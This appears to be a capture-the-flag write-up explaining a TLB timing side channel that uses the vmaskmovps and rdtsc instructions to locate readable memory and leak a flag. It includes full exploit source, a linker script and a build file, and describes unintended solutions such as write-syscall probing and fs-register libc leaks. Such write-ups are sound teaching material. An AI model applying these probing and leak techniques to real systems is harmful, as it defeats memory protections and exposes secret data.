@@ -1,0 +1,182 @@
+import Page from '../../../page.mdx';
+
+<Page>
+
+# Provided files
+- chal.c
+- chal
+- Dockerfile
+
+# Intended
+
+The papers provided in the description implement two different attack that use the same premise.
+
+On x64 processors, physical memory is mapped to virtual memory using a page table. The page table specifies how physical memory is mapped to virtual memory and stores the page permission bits and other information.
+
+See more about paging [here](https://wiki.osdev.org/Paging#64-Bit_Paging).
+
+When a virtual memory address is accessed, the processor must walk the page table in order to determine the physical address to access, which takes some time in order to perform. The processor employs a translation lookaside buffer (TLB) to aggressively cache recent virtual to physical memory mappings to reduce the performance impact of translating virtual to physical addresses. However one can perform a sidechannel attack against the TLB by accessing memory and timing how long it takes to access. A fast access indicates the address is cached in the TLB, and a slow access indicates the address is not cached in the TLB. The problem with this is that one cannot go around arbitrarily accessing every memory address, as you will eventually run into a SEGFAULT and die. You can setup a SIGSEGV handler to catch the crash, but that messes up the timings because control first hands over to the kernel and then the signal handler. Fortunately there are a few instructions that do not fault when accessing an address, and still generate a memory lookup and TLB access. These instructions are `vmaskmov` (first paper) and `prefetch` (second paper) family of instructions.
+
+[vmaskmov](https://www.felixcloutier.com/x86/vmaskmov)
+
+[prefetch](https://www.felixcloutier.com/x86/prefetchh)
+
+The documentation for `vmaskmov` states that:
+
+Faults occur only due to mask-bit required memory accesses that caused the faults. Faults will not occur due to referencing any memory location if the corresponding mask bit for that memory location is 0. For example, no faults will be detected if the mask bits are all zero.
+
+
+Using this our attack looks like this:
+```x86asm
+vpxor ymm0, ymm0, ymm0
+vmaskmovps ymm0, ymm0, ymmword ptr [victim]
+mfence
+rdtsc
+mov rcx, rax
+vmaskmovps ymm0, ymm0, ymmword ptr [victim]
+mfence
+rdtsc
+sub rax, rcx
+```
+
+1. setup zero mask in ymm0
+2. access the victim address, which caches it in the tlb if it is valid
+3. use fences to prevent speculative execution from messing with timings
+4. time the access of vmaskmovps
+
+Using this we can determine which memory addresses are readable and only access those addresses to look for the flag.
+
+<details>
+<summary>**main.c**</summary>
+```c
+typedef unsigned long long u64;
+
+void putchar (char ch) {
+    asm volatile(
+        ".intel_syntax noprefix\n"
+        "mov eax, 1\n"
+        "mov edi, 1\n"
+        "mov rsi, %[buf]\n"
+        "mov rdx, 1\n"
+        "syscall\n"
+        ".att_syntax prefix\n"
+        :: [buf] "r" (&ch)
+        : "rax", "rdi", "rsi", "rdx", "rcx", "r11"
+    );
+}
+
+void puts (char * s) {
+    while (*s != 0) {
+        putchar(*s);
+        s++;
+    }
+    putchar('\n');
+}
+
+void exit(int code) {
+    asm volatile(
+        "mov $60, %%eax\n"
+        "syscall\n"
+        :: [code] "rdi" (code)
+    );
+}
+
+int probe(void * addr) {
+    u64 tic_hi, tic_lo, toc_hi, toc_lo;
+    asm volatile(
+        ".intel_syntax noprefix\n"
+        "vpxor ymm0, ymm0, ymm0\n"
+        "vmaskmovps ymm0, ymm0, ymmword ptr [%[ptr]]\n"
+        "mfence\n"
+        "rdtsc\n"
+        "mov %[hi], rdx\n"
+        "mov %[lo], rax\n"
+        "mfence\n"
+        "vmaskmovps ymm0, ymm0, ymmword ptr [%[ptr]]\n"
+        "mfence\n"
+        "rdtsc\n"
+        "mov %[thi], rdx\n"
+        "mov %[tlo], rax\n"
+        ".att_syntax prefix\n"
+        : [hi] "=r" (tic_hi),
+          [lo] "=r" (tic_lo),
+          [thi] "=r" (toc_hi),
+          [tlo] "=r" (toc_lo)
+        : [ptr] "r" (addr)
+        : "ymm0", "rdx", "rax"
+    );
+    return ((toc_hi << 32) + toc_lo) - ((tic_hi << 32) + tic_lo);
+}
+
+// we put the main function into the `.entry` section
+// and use custom linker script in order to guarantee
+// main is run first in the flat binary
+void __attribute__((section(".entry"))) main () {
+    u64 base = 0x1337000;
+
+    while (base < 0x1337000 + 0x100000000) {
+        int access = probe(base);
+        if (access < 140) {
+            puts("FOUND");
+            puts((char *)base);
+            putchar('\n');
+        }
+        base += 0x1000;
+    }
+}
+```
+</details>
+
+<details>
+<summary>**linker.ld**</summary>
+```text
+ENTRY(main)
+
+SECTIONS {
+    /* here we place `.entry` as the first section */
+    .entry  : { *(.entry) }
+    /* . = .; forces the linker to keep ordering */
+    . = .;
+    .text   : { *(.text.*) }
+    .rodata : { *(.rodata.*) }
+    .data   : { *(.data.*) }
+    .bss    : { *(.bss.*) }
+}
+```
+</details>
+
+<details>
+<summary>**Makefile**</summary>
+```make
+all:
+	gcc \
+	-o main \
+	-nostdlib -nostartfiles -nostdinc \
+	-fno-builtin -fno-stack-protector \
+	-ffreestanding -pie \
+	-Wl,--oformat=binary -Wl,-T,linker.ld \
+	main.c
+```
+</details>
+
+# Unintended
+
+## Accidentally compiled with -no-pie
+I copypasted my build script from another chal that used `-no-pie`, so the binary base was fixed and you could leak the libc to retrieve the stack address. Once you know where the stack is you could retrieve the flag address.
+
+## Bruteforce
+The `write` syscall does not complain about being fed invalid memory address, and simply returns an error. One person simply called write on every memory address starting from `0x1337000` at `0x1000` increments.
+
+## Syscall oracle
+It is also possible to test whether or not an address is readable via the write syscall, can write on each address and inspect the return value. If the value indicates an error, unmapped address, otherwise should be readable.
+
+## Cheese
+Another person simply called `write` with a base of `0x1337000` and a length of `0x1000000` and it prints out the flag. Apparently write simply skips the unmapped regions and only prints the mapped regions ???
+
+## Fs register
+The libc stores a pointer to thread local storage (TLS) in the fs register. The TLS section exists at a fixed offset from the libc, so accessing this register gives a libc leak, then you can walk the stack and get the flag. You can view the fs register in gdb with `p $fs_base`.
+
+## Reading the urandom value
+I stored the urandom value inside a mmapped chunk so that I could unmap it later and make it unaccessible. But I forgot to unmap it :skull:. You could retrieve the address through bruteforce or via the stack. Somebody submitted a ticket where they used a constant offset from the mmapped code to access the urandom value, but I could not reproduce on remote.
+
+</Page>
